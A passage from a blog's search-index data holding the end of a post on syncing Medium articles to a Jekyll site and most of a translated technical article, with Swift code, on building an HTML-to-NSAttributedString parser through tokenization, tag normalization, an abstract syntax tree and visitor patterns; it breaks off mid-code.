tab. Make sure you have the correct settings selected in Settings -&gt; Pages. Things to know The ZMediumToMarkdown GitHub Action for syncing Medium posts runs automatically every day by default. You can also manually trigger it on the GitHub Actions page or change the sync frequency as needed. Every commit and post change will trigger the Automatic Build &amp; Pages build and deployment action. Please wait for this action to finish before checking the final result. You can create your own Markdown posts in the _posts directory by naming the file as YYYY-MM-DD-POSTNAME and it is recommended to use lowercase file names. You can include images and other resources in the /assets directory. Also, if you would like to remove the ZMediumToMarkdown watermark located at the bottom of the post, you may do so. I don‚Äôt mind. You can edit the Ruby file at tools/optimize_markdown.rb and uncomment lines 10‚Äì12. This will automatically remove the ZMediumToMarkdown watermark at the end of all posts during Jekyll build time. Since ZMediumToMarkdown is not an official tool and Medium does not provide a public API for it, I cannot guarantee that the parser target will remain unchanged in the future. However, I have tested it with as many cases as possible. If you encounter any rendering errors or Jekyll build errors, please feel free to create an issue, and I will fix them as soon as possible. If you have any questions or suggestions, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "HTML Parsing TechniquesÔΩúBuild Custom Parsers for NSAttributedString Rendering", "url": "/posts/zrealm-dev/html-parsing-techniques-build-custom-parsers-for-nsattributedstring-rendering-2724f02f6e7/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios-app-development, html-parsing, nsattributedstring, html, rendering", "date": "2023-03-12 01:09:22 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!The Story of Building a Handmade HTML ParserZMarkupParser HTML to NSAttributed...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!The Story of Building a Handmade HTML ParserZMarkupParser HTML to NSAttributedString Rendering Engine Development DiaryTokenization conversion of HTML strings, normalization processing, generation of abstract syntax trees, application of visitor and builder patterns, and some miscellaneous discussions‚Ä¶ContinuationLast year, I published an article titled ‚Äú[TL;DR] Implementing iOS NSAttributedString HTML Render by Yourself,‚Äù which briefly introduced using XMLParser to parse HTML and convert it into NSAttributedString.Key. The code structure and ideas in the article were quite messy, as it was just a quick record of issues I encountered earlier and I didn‚Äôt spend much time researching this topic back then.Convert HTML String to NSAttributedStringRevisiting this topic, we need to convert the HTML string provided by the API into an NSAttributedString and apply the corresponding styles to display it in a UITextView/UILabel.e.g. &lt;b&gt;Test&lt;a&gt;Link&lt;/a&gt;&lt;/b&gt; should display as Test Link Note 1It is not recommended to use HTML as the communication and rendering medium between the app and data because the HTML specification is too flexible. Apps cannot support all HTML styles and there is no official HTML conversion rendering engine. Note 2Starting from iOS 14, you can use the official native AttributedString to parse Markdown or include the apple/swift-markdown Swift Package to parse Markdown. Note 3Due to the large scale of our project and the long-term use of HTML as the medium, we are currently unable to fully switch to Markdown or other markup languages. Note 4The HTML here is not meant to display a full HTML webpage, but only to use HTML as a style for rendering Markdown string styles.(To render a full page with complex content including images and tables, you still need to use WebView loadHTML) It is highly recommended to use Markdown as the string rendering markup language. If your project faces the same issue as mine and you have no choice but to use HTML without an elegant tool to convert to NSAttributedString, then please use it. Friends who read the previous article can directly skip to the ZhgChgLi / ZMarkupParser section.NSAttributedString.DocumentType.htmlThe methods for HTML to NSAttributedString found online usually require us to directly use NSAttributedString‚Äôs built-in options to render HTML. An example is shown below:let htmlString = \"&lt;b&gt;Test&lt;a&gt;Link&lt;/a&gt;&lt;/b&gt;\"let data = htmlString.data(using: String.Encoding.utf8)!let attributedOptions:[NSAttributedString.DocumentReadingOptionKey: Any] = [ .documentType :NSAttributedString.DocumentType.html, .characterEncoding: String.Encoding.utf8.rawValue]let attributedString = try! NSAttributedString(data: data, options: attributedOptions, documentAttributes: nil)Problems with this approach: Poor performance: This method renders styles through the WebView Core, then switches back to the Main Thread for UI display; rendering over 300 characters takes 0.03 seconds. Word swallowing: For example, marketing copy might use &lt;Congratulation!&gt;, which will be treated as an HTML tag and removed. Cannot customize: For example, you cannot specify the exact boldness level of HTML bold text in NSAttributedString. iOS ‚â• 12 intermittent crashes issue with no official fix In iOS 15, a frequent crash issue occurred. Testing showed a 100% crash rate under low battery conditions (fixed in iOS ‚â• 15.2). Strings that are too long will cause a crash. Testing shows that inputting strings longer than 54,600 characters will 100% cause a crash (EXC_BAD_ACCESS). The most painful issue for us remains the crash problem. From the release of iOS 15 to 15.2 before the fix, the app was consistently dominated by this issue. According to data, from 2022/03/11 to 2022/06/08, it caused over 2.4K crashes and affected more than 1.4K users.This crash issue has existed since iOS 12. iOS 15 just hit a bigger snag, but I guess the fix in iOS 15.2 is only a patch; Apple cannot completely eliminate it.Secondly, the issue is performance. As a string style Markup Language, it is heavily used in App UILabel/UITextView. As mentioned earlier, one Label requires 0.03 seconds, and multiplying this by multiple UILabel/UITextView instances can cause noticeable lag in user interaction.XMLParserThe second method is introduced in the previous article, using XMLParser to parse into corresponding NSAttributedString keys and apply styles.You can refer to the implementation of SwiftRichString and the previous article. The previous article only explored using XMLParser to parse HTML and perform corresponding conversions, completing an experimental implementation. However, it did not design it as a well-structured and extensible ‚Äútool.‚ÄùProblems with this approach: Error tolerance 0: &lt;br&gt; / &lt;Congratulation!&gt; / &lt;b&gt;Bold&lt;i&gt;Bold+Italic&lt;/b&gt;Italic&lt;/i&gt;The above three HTML cases may appear, and XMLParser will throw an error and show a blank screen when parsing them. When using XMLParser, the HTML string must fully comply with XML rules and cannot be displayed correctly with tolerance like a browser or NSAttributedString.DocumentType.html. Standing on the Shoulders of GiantsNeither of the above two solutions can perfectly and elegantly solve the HTML problem, so I started searching for existing solutions. johnxnguyen / DownOnly supports converting input Markdown to Any (XML/NSAttributedString‚Ä¶), but does not support converting input HTML. malcommac / SwiftRichStringThe underlying implementation uses XMLParser, and testing the above cases also shows the same issue with a fault tolerance rate of 0. scinfu / SwiftSoupOnly supports HTML Parser (Selector) does not support conversion to NSAttributedString. Searched everywhere but all results are similar to the above project Orz, no giant shoulders to stand on.ZhgChgLi/ZMarkupParserWithout the shoulders of giants, I had to become the giant myself, so I developed an HTML String to NSAttributedString tool.Developed purely in Swift, it uses Regex to parse HTML tags and performs tokenization. It analyzes and corrects tag accuracy (fixing unclosed tags &amp; misaligned tags), then converts them into an abstract syntax tree. Finally, it uses the Visitor Pattern to map HTML tags to abstract styles, resulting in the final NSAttributedString output; no parser libraries are used.Features Support HTML Render (to NSAttributedString) / Stripper (remove HTML tags) / Selector functions Higher Performance than NSAttributedString.DocumentType.html Automatically analyze and correct tag accuracy (fix tags without end tags &amp; misplaced tags) Support dynamic styling from style=\"color:red...\" Supports custom style specification, for example, making bold text bolder Supports flexible expandable tags or custom tags and attributes For detailed introduction, installation, and usage, please refer to this article: „Äå ZMarkupParser HTML String to NSAttributedString Tool „ÄçYou can directly git clone the project, then open ZMarkupParser.xcworkspace. Select the ZMarkupParser-Demo target and build &amp; run it to try it out.ZMarkupParserTechnical DetailsNext is the main focus of this article, sharing the technical details about developing this tool.Overview of Operation ProcessThe above image shows the general workflow. The following article will explain each step in detail and include the code. ‚ö†Ô∏è This article simplifies the demo code by reducing abstraction and performance considerations, focusing mainly on explaining the operating principles. For the final results, please refer to the project Source Code.Tokenization a.k.a parser, parsingWhen it comes to HTML rendering, the most important part is parsing. Previously, HTML was parsed as XML using XMLParser; however, this cannot handle the fact that everyday HTML is not 100% XML, causing parser errors and lacking dynamic correction.After ruling out the use of XMLParser, the only option left for us in Swift is to use Regex for matching and parsing.At first, I didn‚Äôt think much and planned to use regex to extract ‚Äúpaired‚Äù HTML tags directly, then recursively search layer by layer inside until the end. However, this approach couldn‚Äôt handle nested HTML tags or support error tolerance for misaligned tags. Therefore, we changed the strategy to extract ‚Äúsingle‚Äù HTML tags, record whether they are Start Tags, Close Tags, or Self-Closing Tags, and combine other strings into a parsed result array.Tokenization structure is as follows:enum HTMLParsedResult { case start(StartItem) // &lt;a&gt; case close(CloseItem) // &lt;/a&gt; case selfClosing(SelfClosingItem) // &lt;br/&gt; case rawString(NSAttributedString)}extension HTMLParsedResult { class SelfClosingItem { let tagName: String let tagAttributedString: NSAttributedString let attributes: [String: String]? init(tagName: String, tagAttributedString: NSAttributedString, attributes: [String : String]?) { self.tagName = tagName self.tagAttributedString = tagAttributedString self.attributes = attributes } } class StartItem { let tagName: String let tagAttributedString: NSAttributedString let attributes: [String: String]? // Start Tag might be an abnormal HTML tag or normal text e.g. &lt;Congratulation!&gt;. After normalization, if found to be an isolated Start Tag, mark as True. var isIsolated: Bool = false init(tagName: String, tagAttributedString: NSAttributedString, attributes: [String : String]?) { self.tagName = tagName self.tagAttributedString = tagAttributedString self.attributes = attributes } // Used for automatic filling correction during normalization func convertToCloseParsedItem() -&gt; CloseItem { return CloseItem(tagName: self.tagName) } // Used for automatic filling correction during normalization func convertToSelfClosingParsedItem() -&gt; SelfClosingItem { return SelfClosingItem(tagName: self.tagName, tagAttributedString: self.tagAttributedString, attributes: self.attributes) } } class CloseItem { let tagName: String init(tagName: String) { self.tagName = tagName } }}The regex used is as follows:&lt;(?:(?&lt;closeTag&gt;\\/)?(?&lt;tagName&gt;[A-Za-z0-9]+)(?&lt;tagAttributes&gt;(?:\\s*(\\w+)\\s*=\\s*([\"\\|']).*?\\5)*)\\s*(?&lt;selfClosingTag&gt;\\/)?&gt;)-&gt; Online Regex101 Playground closeTag: matches &lt; / a&gt; tagName: matches &lt; a &gt; or , &lt;/ a &gt; tagAttributes: Match &lt;a href=\"https://zhgchg.li\" style=\"color:red\" &gt; selfClosingTag: Match &lt;br / &gt; *This regex can still be optimized, will do it later The latter part of the article offers more details on regular expressions for those interested.Putting it all together:var tokenizationResult: [HTMLParsedResult] = []let expression = try? NSRegularExpression(pattern: pattern, options: expressionOptions)let attributedString = NSAttributedString(string: \"&lt;a&gt;Li&lt;b&gt;nk&lt;/a&gt;Bold&lt;/b&gt;\")let totalLength = attributedString.string.utf16.count // utf-16 supports emojivar lastMatch: NSTextCheckingResult?// Start Tags Stack, First In Last Out (FILO)// Check if the HTML string needs further normalization to fix misalignment or add Self-Closing Tagsvar stackStartItems: [HTMLParsedResult.StartItem] = []var needFormatter: Bool = falseexpression.enumerateMatches(in: attributedString.string, range: NSMakeRange(0, totalLength)) { match, _, _ in if let match = match { // Check the string between tags or before the first tag // e.g. Test&lt;a&gt;Link&lt;/a&gt;zzz&lt;b&gt;bold&lt;/b&gt;Test2 -&gt; Test, zzz let lastMatchEnd = lastMatch?.range.upperBound ?? 0 let currentMatchStart = match.range.lowerBound if currentMatchStart &gt; lastMatchEnd { let rawStringBetweenTag = attributedString.attributedSubstring(from: NSMakeRange(lastMatchEnd, (currentMatchStart - lastMatchEnd))) tokenizationResult.append(.rawString(rawStringBetweenTag)) } // &lt;a href=\"https://zhgchg.li\"&gt;, &lt;/a&gt; let matchAttributedString = attributedString.attributedSubstring(from: match.range) // a, a let matchTag = attributedString.attributedSubstring(from: match.range(withName: \"tagName\"))?.string.trimmingCharacters(in: .whitespacesAndNewlines).lowercased() // false, true let matchIsEndTag = matchResult.attributedString(from: match.range(withName: \"closeTag\"))?.string.trimmingCharacters(in: .whitespacesAndNewlines) == \"/\" // href=\"https://zhgchg.li\", nil // Use regex to parse HTML Attributes to [String: String], see Source Code let matchTagAttributes = parseAttributes(matchResult.attributedString(from: match.range(withName: \"tagAttributes\"))) // false, false let matchIsSelfClosingTag = matchResult.attributedString(from: match.range(withName: \"selfClosingTag\"))?.string.trimmingCharacters(in: .whitespacesAndNewlines) == \"/\" if let matchAttributedString = matchAttributedString, let matchTag = matchTag { if matchIsSelfClosingTag { // e.g. &lt;br/&gt; tokenizationResult.append(.selfClosing(.init(tagName: matchTag, tagAttributedString: matchAttributedString, attributes: matchTagAttributes))) } else { // e.g. &lt;a&gt; or &lt;/a&gt; if matchIsEndTag { // e.g. &lt;/a&gt; // Find the last occurrence of the same TagName in the stack if let index = stackStartItems.lastIndex(where: { $0.tagName == matchTag }) { // If not the last one, it means misalignment or missing closing tag if index != stackStartItems.count - 1 { needFormatter = true } tokenizationResult.append(.close(.init(tagName: matchTag))) stackStartItems.remove(at: index) } else { // Extra close tag e.g &lt;/a&gt; // Ignore as it won't affect further processing } } else { // e.g. &lt;a&gt; let startItem: HTMLParsedResult.StartItem = HTMLParsedResult.StartItem(tagName: matchTag, tagAttributedString: matchAttributedString, attributes: matchTagAttributes) tokenizationResult.append(.start(startItem)) // Push to stack stackStartItems.append(startItem) } } } lastMatch = match }}// Check trailing RawString// e.g. Test&lt;a&gt;Link&lt;/a&gt;Test2 -&gt; Test2if let lastMatch = lastMatch { let currentIndex = lastMatch.range.upperBound if totalLength &gt; currentIndex { // Remaining string exists let restString = attributedString.attributedSubstring(from: NSMakeRange(currentIndex, (totalLength - currentIndex))) tokenizationResult.append(.rawString(restString)) }} else { // lastMatch = nil means no tags found, all plain text let restString = attributedString.attributedSubstring(from: NSMakeRange(0, totalLength)) tokenizationResult.append(.rawString(restString))}// Check if stack is empty; if not, mark unmatched Start Tags as isolatedfor stackStartItem in stackStartItems { stackStartItem.isIsolated = true needFormatter = true}print(tokenizationResult)// [// .start(\"a\",[\"href\":\"https://zhgchg.li\"])// .rawString(\"Li\")// .start(\"b\",nil)// .rawString(\"nk\")// .close(\"a\")// .rawString(\"Bold\")// .close(\"b\")// ]The operation process is shown in the above diagram.The final result will be an array of tokenization results. Implementation corresponding to the source code in HTMLStringToParsedResultProcessor.swiftNormalization a.k.a Formatter, normalizationAfter obtaining the preliminary parsing results in the previous step, if normalization is still needed during parsing, this step is required to automatically fix HTML tag issues.There are three types of HTML tag issues: HTML Tag but Missing Close Tag: for example &lt;br&gt; Plain text treated as HTML Tag: for example &lt;Congratulation!&gt; HTML Tag misalignment issue: For example, &lt;a&gt;Li&lt;b&gt;nk&lt;/a&gt;Bold&lt;/b&gt; The fix is simple. We need to iterate through the elements of the Tokenization result and try to fill in the missing parts.The workflow is shown in the above diagram.var normalizationResult = tokenizationResult// Start Tags Stack, First In Last Out (FILO)var stackExpectedStartItems: [HTMLParsedResult.StartItem] = []var itemIndex = 0while itemIndex &lt; newItems.count { switch newItems[itemIndex] { case .start(let item): if item.isIsolated { // If it is an isolated Start Tag if WC3HTMLTagName(rawValue: item.tagName) == nil &amp;&amp; (item.attributes?.isEmpty ?? true) { // If not a WC3 defined HTML Tag &amp; has no HTML Attributes // See Source Code for WC3HTMLTagName Enum // Considered as normal text mistaken as HTML Tag // Change to raw string type normalizationResult[itemIndex] = .rawString(item.tagAttributedString) } else { // Otherwise, convert to self-closing tag, e.g. &lt;br&gt; -&gt; &lt;br/&gt; normalizationResult[itemIndex] = .selfClosing(item.convertToSelfClosingParsedItem()) } itemIndex += 1 } else { // Normal Start Tag, push to Stack stackExpectedStartItems.append(item) itemIndex += 1 } case .close(let item): // Encounter Close Tag // Get Tags between Start Stack Tag and this Close Tag // e.g &lt;a&gt;&lt;u&gt;&lt;b&gt;[CurrentIndex]&lt;/a&gt;&lt;/u&gt;&lt;/b&gt; -&gt; gap 0 // e.g &lt;a&gt;&lt;u&gt;&lt;b&gt;[CurrentIndex]&lt;/a&gt;&lt;/u&gt;&lt;/b&gt; -&gt; gap b,u let reversedStackExpectedStartItems = Array(stackExpectedStartItems.reversed()) guard let reversedStackExpectedStartItemsOccurredIndex = reversedStackExpectedStartItems.firstIndex(where: { $0.tagName == item.tagName }) else { itemIndex += 1 continue } let reversedStackExpectedStartItemsOccurred = Array(reversedStackExpectedStartItems.prefix(upTo: reversedStackExpectedStartItemsOccurredIndex)) // gap 0 means tags are correctly nested guard reversedStackExpectedStartItemsOccurred.count != 0 else { // is pair, pop stackExpectedStartItems.removeLast() itemIndex += 1 continue } // There are intermediate tags, auto-insert missing tags before and after // e.g &lt;a&gt;&lt;u&gt;&lt;b&gt;[CurrentIndex]&lt;/a&gt;&lt;/u&gt;&lt;/b&gt; -&gt; // e.g &lt;a&gt;&lt;u&gt;&lt;b&gt;[CurrentIndex]&lt;/b&gt;&lt;/u&gt;&lt;/a&gt;&lt;b&gt;&lt;/u&gt;&lt;/u&gt;&lt;/b&gt; let stackExpectedStartItemsOccurred = Array(reversedStackExpectedStartItemsOccurred.reversed()) let afterItems = stackExpectedStartItemsOccurred.map({ HTMLParsedResult.start($0) }) let beforeItems = reversedStackExpectedStartItemsOccurred.map({ HTMLParsedResult.close($0.convertToCloseParsedItem()) }) normalizationResult.insert(contentsOf: afterItems, at: newItems.index(after: itemIndex)) normalizationResult.insert(contentsOf: beforeItems, at: itemIndex) itemIndex = newItems.index(after: itemIndex) + stackExpectedStartItemsOccurred.count // Update Start Stack Tags // e.g. -&gt; b,u stackExpectedStartItems.removeAll { startItem in return reversedStackExpectedStartItems.prefix(through: reversedStackExpectedStartItemsOccurredIndex).contains(where: { $0 === startItem }) } case .selfClosing, .rawString: itemIndex += 1 }}print(normalizationResult)// [// .start(\"a\",[\"href\":\"https://zhgchg.li\"])// .rawString(\"Li\")// .start(\"b\",nil)// .rawString(\"nk\")// .close(\"b\")// .close(\"a\")// .start(\"b\",nil)// .rawString(\"Bold\")// .close(\"b\")// ] Implementation corresponding to the source code in HTMLParsedResultFormatterProcessor.swiftAbstract Syntax Tree a.k.a AST, Abstract Syntax TreeAfter completing data preprocessing with Tokenization &amp; Normalization, the next step is to convert the results into an abstract tree üå≤.As shown in the image aboveConverting to an abstract syntax tree makes future operations and expansions easier, such as implementing Selector functionality or other conversions like HTML to Markdown. Similarly, if we want to add Markdown to NSAttributedString later, we only need to implement Markdown tokenization and normalization to achieve it.First, we define a Markup Protocol with Child &amp; Parent properties to record leaf and branch information:protocol Markup: AnyObject { var parentMarkup: Markup? { get set } var childMarkups: [Markup] { get set } func appendChild(markup: Markup) func prependChild(markup: Markup) func accept&lt;V: MarkupVisitor&gt;(_ visitor: V) -&gt; V.Result}extension Markup { func appendChild(markup: Markup) { markup.parentMarkup = self childMarkups.append(markup) } func prependChild(markup: Markup) { markup.parentMarkup = self childMarkups.insert(markup, at: 0) }}Additionally, use the Visitor Pattern to define each style attribute as an Element object, then apply different Visit strategies to obtain individual application results.protocol MarkupVisitor { associatedtype Result func visit(markup: Markup) -&gt; Result func visit(_ markup: RootMarkup) -&gt; Result func visit(_ markup: RawStringMarkup) -&gt; Result func visit(_ markup: BoldMarkup) -&gt; Result func visit(_ markup: LinkMarkup) -&gt; Result //...}extension MarkupVisitor { func visit(markup: Markup) -&gt; Result { return markup.accept(self) }}Basic Markup Elements:// Root nodefinal class RootMarkup: Markup { weak var parentMarkup: Markup? = nil var childMarkups: [Markup] = [] func accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : MarkupVisitor { return visitor.visit(self) }}// Leaf nodefinal class RawStringMarkup: Markup { let attributedString: NSAttributedString init(attributedString: NSAttributedString) { self.attributedString = attributedString } weak var parentMarkup: Markup? = nil var childMarkups: [Markup] = [] func accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : MarkupVisitor { return visitor.visit(self) }}Define Markup Style Nodes:// Branch nodes:// Link stylefinal class LinkMarkup: Markup { weak var parentMarkup: Markup? = nil var childMarkups: [Markup] = [] func accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : MarkupVisitor { return visitor.visit(self) }}// Bold stylefinal class BoldMarkup: Markup { weak var parentMarkup: Markup? = nil var childMarkups: [Markup] = [] func accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : MarkupVisitor { return visitor.visit(self) }} Corresponding implementation in the source code MarkupBefore converting to an abstract tree, we also need to‚Ä¶MarkupComponentBecause our tree structure does not depend on any data structure (for example, a node/LinkMarkup should have URL information to proceed with rendering).Therefore, we define a separate container to store tree nodes and their related data:protocol MarkupComponent { associatedtype T var markup: Markup { get } var value: T { get } init(markup: Markup, value: T)}extension Sequence where Iterator.Element: MarkupComponent { func value(markup: Markup) -&gt; Element.T? { return self.first(where:{ $0.markup === markup })?.value as? Element.T }} Implementation corresponding to the MarkupComponent in the source codeYou can also declare Markup as Hashable and directly use a Dictionary to store values [Markup: Any]. However, Markup cannot be used as a regular type and must be written as any Markup.HTMLTag &amp; HTMLTagName &amp; HTMLTagNameVisitorFor the HTML Tag Name section, we added a layer of abstraction, allowing users to decide which tags need to be processed. This also makes future expansion easier. For example, the &lt;strong&gt; tag name can also correspond to BoldMarkup.public protocol HTMLTagName { var string: String { get } func accept&lt;V: HTMLTagNameVisitor&gt;(_ visitor: V) -&gt; V.Result}public struct A_HTMLTagName: HTMLTagName { public let string: String = WC3HTMLTagName.a.rawValue public init() { } public func accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : HTMLTagNameVisitor { return visitor.visit(self) }}public struct B_HTMLTagName: HTMLTagName { public let string: String = WC3HTMLTagName.b.rawValue public init() { } public func accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : HTMLTagNameVisitor { return visitor.visit(self) }} Corresponding implementation in the source code of HTMLTagNameVisitor Also refer to the W3C wiki listing HTML tag name enums: WC3HTMLTagName.swiftHTMLTag is simply a container object because we want to allow external specification of the styles corresponding to the HTML tag, so we declare a container to group them together:struct HTMLTag { let tagName: HTMLTagName let customStyle: MarkupStyle? // Explained later in Render section init(tagName: HTMLTagName, customStyle: MarkupStyle? = nil) { self.tagName = tagName self.customStyle = customStyle }} Corresponding implementation in the source code HTMLTagHTMLTagNameToHTMLMarkupVisitorstruct HTMLTagNameToMarkupVisitor: HTMLTagNameVisitor { typealias Result = Markup let attributes: [String: String]? func visit(_ tagName: A_HTMLTagName) -&gt; Result { return LinkMarkup() } func visit(_ tagName: B_HTMLTagName) -&gt; Result { return BoldMarkup() } //...} Implementation corresponding to HTMLTagNameToHTMLMarkupVisitor in the source codeConvert to Abstract Syntax Tree with HTML DataWe need to convert the normalized HTML data into an abstract tree. First, declare a MarkupComponent data structure to store the HTML data:struct HTMLElementMarkupComponent: MarkupComponent { struct HTMLElement { let tag: HTMLTag let tagAttributedString: NSAttributedString let attributes: [String: String]? } typealias T = HTMLElement let markup: Markup let value: HTMLElement init(markup: Markup, value: HTMLElement) { self.markup = markup self.value = value }}Convert to Markup Abstract Tree:var htmlElementComponents: [HTMLElementMarkupComponent] = []let rootMarkup = RootMarkup()var currentMarkup: Markup = rootMarkuplet htmlTags: [String: HTMLTag]init(htmlTags: [HTMLTag]) { self.htmlTags = Dictionary(uniqueKeysWithValues: htmlTags.map{ ($0.tagName.string, $0) })}// Start Tags Stack, ensure correct pop of tags// Normalization has been done before, so errors are unlikely, just to be safevar stackExpectedStartItems: [HTMLParsedResult.StartItem] = []for thisItem in from { switch thisItem { case .start(let item): let visitor = HTMLTagNameToMarkupVisitor(attributes: item.attributes) let htmlTag = self.htmlTags[item.tagName] ?? HTMLTag(tagName: ExtendTagName(item.tagName)) // Use Visitor to get the corresponding Markup let markup = visitor.visit(tagName: htmlTag.tagName) // Add self as a leaf node of the current branch // Become the current branch node htmlElementComponents.append(.init(markup: markup, value: .init(tag: htmlTag, tagAttributedString: item.tagAttributedString, attributes: item.attributes))) currentMarkup.appendChild(markup: markup) currentMarkup = markup stackExpectedStartItems.append(item) case .selfClosing(let item): // Directly add as a leaf node of the current branch let visitor = HTMLTagNameToMarkupVisitor(attributes: item.attributes) let htmlTag = self.htmlTags[item.tagName] ?? HTMLTag(tagName: ExtendTagName(item.tagName)) let markup = visitor.visit(tagName: htmlTag.tagName) htmlElementComponents.append(.init(markup: markup, value: .init(tag: htmlTag, tagAttributedString: item.tagAttributedString, attributes: item.attributes))) currentMarkup.appendChild(markup: markup) case .close(let item): if let lastTagName = stackExpectedStartItems.popLast()?.tagName, lastTagName == item.tagName { // When encountering a Close Tag, return to the previous level currentMarkup = currentMarkup.parentMarkup ?? currentMarkup } case .rawString(let attributedString): // Directly add as a leaf node of the current branch currentMarkup.appendChild(markup: RawStringMarkup(attributedString: attributedString)) }}// print(htmlElementComponents)// [(markup: LinkMarkup, (tag: a, attributes: [\"href\":\"zhgchg.li\"]...)]The operation result is shown in the above image. Implementation corresponding to the source code in HTMLParsedResultToHTMLElementWithRootMarkupProcessor.swiftAt this point, we have actually completed the Selector functionality üéâpublic class HTMLSelector: CustomStringConvertible { let markup: Markup let componets: [HTMLElementMarkupComponent] init(markup: Markup, componets: [HTMLElementMarkupComponent]) { self.markup = markup self.componets = componets } public func filter(_ htmlTagName: String) -&gt; [HTMLSelector] { let result = markup.childMarkups.filter({ componets.value(markup: $0)?.tag.tagName.isEqualTo(htmlTagName) ?? false }) return result.map({ .init(markup: $0, componets: componets) }) } //...}We can filter leaf node objects layer by layer. Corresponding implementation in the source code for HTMLSelectorParser ‚Äî HTML to MarkupStyle (Abstract of NSAttributedString.Key)Next, we need to complete the conversion from HTML to MarkupStyle (NSAttributedString.Key).NSAttributedString sets text styles through NSAttributedString.Key attributes. We abstract all fields of NSAttributedString.Key to correspond to MarkupStyle, MarkupStyleColor, MarkupStyleFont, and MarkupStyleParagraphStyle.Purpose: The original data structure for Attributes is [NSAttributedString.Key: Any?]. If exposed directly, it‚Äôs hard to control the values users provide, and incorrect values can cause crashes, such as .font: 123. Styles need to be inheritable. For example, in &lt;a&gt;&lt;b&gt;test&lt;/b&gt;&lt;/a&gt;, the style of the text ‚Äútest‚Äù should inherit both the link and bold styles (bold + link). Exposing the Dictionary directly makes it difficult to control inheritance properly. Encapsulating iOS/macOS (UIKit/AppKit) Objects MarkupStyle Structpublic struct MarkupStyle { public var font:MarkupStyleFont public var paragraphStyle:MarkupStyleParagraphStyle public var foregroundColor:MarkupStyleColor? = nil public var backgroundColor:MarkupStyleColor? = nil public var ligature:NSNumber? = nil public var kern:NSNumber? = nil public var tracking:NSNumber? = nil public var strikethroughStyle:NSUnderlineStyle? = nil public var underlineStyle:NSUnderlineStyle? = nil public var strokeColor:MarkupStyleColor? = nil public var strokeWidth:NSNumber? = nil public var shadow:NSShadow? = nil public var textEffect:String? = nil public var attachment:NSTextAttachment? = nil public var link:URL? = nil public var baselineOffset:NSNumber? = nil public var underlineColor:MarkupStyleColor? = nil public var strikethroughColor:MarkupStyleColor? = nil public var obliqueness:NSNumber? = nil public var expansion:NSNumber? = nil public var writingDirection:NSNumber? = nil public var verticalGlyphForm:NSNumber? = nil //... // Inherited from... // Default: If field is nil, fill from the current data object 'from' mutating func fillIfNil(from: MarkupStyle?) { guard let from = from else { return } var currentFont = self.font currentFont.fillIfNil(from: from.font) self.font = currentFont var currentParagraphStyle = self.paragraphStyle currentParagraphStyle.fillIfNil(from: from.paragraphStyle) self.paragraphStyle = currentParagraphStyle //.. } // MarkupStyle to NSAttributedString.Key: Any func render() -&gt; [NSAttributedString.Key: Any] { var data: [NSAttributedString.Key: Any] = [:] if let font = font.getFont() { data[.font] = font } if let ligature = self.ligature { data[.ligature] = ligature } //... return data }}public struct MarkupStyleFont: MarkupStyleItem { public enum FontWeight { case style(FontWeightStyle) case rawValue(CGFloat) } public enum FontWeightStyle: String { case ultraLight, light, thin, regular, medium, semibold, bold, heavy, black // ... } public var size: CGFloat? public var weight: FontWeight? public var italic: Bool? //...}public struct MarkupStyleParagraphStyle: MarkupStyleItem { public var lineSpacing:CGFloat? = nil public var paragraphSpacing:CGFloat? = nil public var alignment:NSTextAlignment? = nil public var headIndent:CGFloat? = nil public var tailIndent:CGFloat? = nil public var firstLineHeadIndent:CGFloat? = nil public var minimumLineHeight:CGFloat? = nil public var maximumLineHeight:CGFloat? = nil public var lineBreakMode:NSLineBreakMode? = nil public var baseWritingDirection:NSWritingDirection? = nil public var lineHeightMultiple:CGFloat? = nil public var paragraphSpacingBefore:CGFloat? = nil public var hyphenationFactor:Float? = nil public var usesDefaultHyphenation:Bool? = nil public var tabStops: [NSTextTab]? = nil public var defaultTabInterval:CGFloat? = nil public var textLists: [NSTextList]? = nil public var allowsDefaultTighteningForTruncation:Bool? = nil public var lineBreakStrategy: NSParagraphStyle.LineBreakStrategy? = nil //...}public struct MarkupStyleColor { let red: Int let green: Int let blue: Int let alpha: CGFloat //...} Implementation corresponding to MarkupStyle in the source code Also refer to the W3c wiki, browser predefined color name listing corresponding color name text &amp; color R,G,B enum: MarkupStyleColorName.swiftHTMLTagStyleAttribute &amp; HTMLTagStyleAttributeVisitorHere, let‚Äôs mention these two objects again, because HTML tags allow styling through CSS; similarly, we apply the same abstraction used for HTMLTagName to the HTML style attribute.For example, HTML might give: &lt;a style=‚Äùcolor:red;font-size:14px‚Äù&gt;RedLink&lt;/a&gt;, which means the link should be set to red color and size 14px.public protocol HTMLTagStyleAttribute { var styleName: String { get } func accept&lt;V: HTMLTagStyleAttributeVisitor&gt;(_ visitor: V) -&gt; V.Result}public protocol HTMLTagStyleAttributeVisitor { associatedtype Result func visit(styleAttribute: HTMLTagStyleAttribute) -&gt; Result func visit(_ styleAttribute: ColorHTMLTagStyleAttribute) -&gt; Result func visit(_ styleAttribute: FontSizeHTMLTagStyleAttribute) -&gt; Result //...}public extension HTMLTagStyleAttributeVisitor { func visit(styleAttribute: HTMLTagStyleAttribute) -&gt; Result { return styleAttribute.accept(self) }} Implementation corresponding to HTMLTagStyleAttribute in the source codeHTMLTagStyleAttributeToMarkupStyleVisitorstruct 